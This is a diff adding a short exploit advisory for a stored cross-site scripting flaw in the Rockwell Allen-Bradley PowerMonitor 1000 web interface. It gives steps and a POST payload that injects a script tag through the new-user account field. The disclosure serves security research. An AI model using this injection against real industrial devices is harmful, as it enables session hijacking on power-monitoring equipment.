@@ -1,0 +1,21 @@
+# Exploit Title: Rockwell Automation Allen-Bradley PowerMonitor 1000 - Cross-Site Scripting
+# Date: 2018-11-27
+# Exploit Author: Luca.Chiou
+# Vendor Homepage: https://www.rockwellautomation.com/
+# Version: 1408-EM3A-ENT B
+# Tested on: It is a proprietary devices: https://ab.rockwellautomation.com/zh/Energy-Monitoring/1408-PowerMonitor-1000
+# CVE : N/A
+
+# 1. Description:
+# In Rockwell Automation Allen-Bradley PowerMonitor 1000 web page,
+# user can add a new user by access the /Security/Security.shtm.
+# When users add a new user, the new user’s account will in the post data.
+# Attackers can inject malicious XSS code in user’s account parameter of post data.
+# The user’s account parameter will be stored in database, so that cause a stored XSS vulnerability.
+
+# 2. Proof of Concept:
+# Browse http://<Your Modem IP>/Security/Security.shtm
+# In page Security.shtm, add a new user
+# Send this post data:
+
+/Security/cgi-bin/security|0|0|<script>alert(123)</script>
